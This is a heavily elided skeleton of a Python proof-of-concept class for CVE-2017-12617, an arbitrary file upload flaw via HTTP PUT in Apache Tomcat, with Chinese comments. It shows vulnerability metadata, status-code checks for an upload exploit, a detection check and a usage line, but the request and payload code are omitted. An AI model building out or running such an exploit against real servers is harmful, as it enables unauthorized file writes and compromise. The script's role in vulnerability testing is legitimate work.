...
class DemoPOC:
    ...
    CVE_ID = "CVE-2017-12617"            # CVE编号
    Vul_name = "Tomcat PUT 文件上传漏洞"    # 漏洞名称
    Type = "Arbitrary File Write"         # 漏洞类型
    Description = "Apache Tomcat 7.0.0至7.0.79中存在PUT文件上传漏洞。" # 漏洞描述
    Script_type = "python"               # POC类型（暂时只支持python）
    Script = "CVE_2017_12617.py"         # POC文件名（包含后缀）
    ...
    def _exploit(self):
        ...
        try:
            ...
            if response.status_code in [201, 204]:
                result['ExploitResponse'] = f"File uploaded successfully to {target_url}"
                return True
            else:
                result['ExploitResponse'] = f"[SAFE] File upload failed with status code {response.status_code}"
                return False
        except requests.RequestException as e:
            result['Error'] = f"[ERROR] {self.url} 连接失败: {e}"
            return result
    ...
    def checking(self):
        ...
        try:
            ...
            if response.status_code == 200 and 'hello' in response.text:
                return f"[!] {self.url} 存在CVE-2017-12617 Apache Tomcat PUT文件上传漏洞"
            else:
...
if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python CVE_2017_12617.py <url> <ip> <port>")
        sys.exit(1)
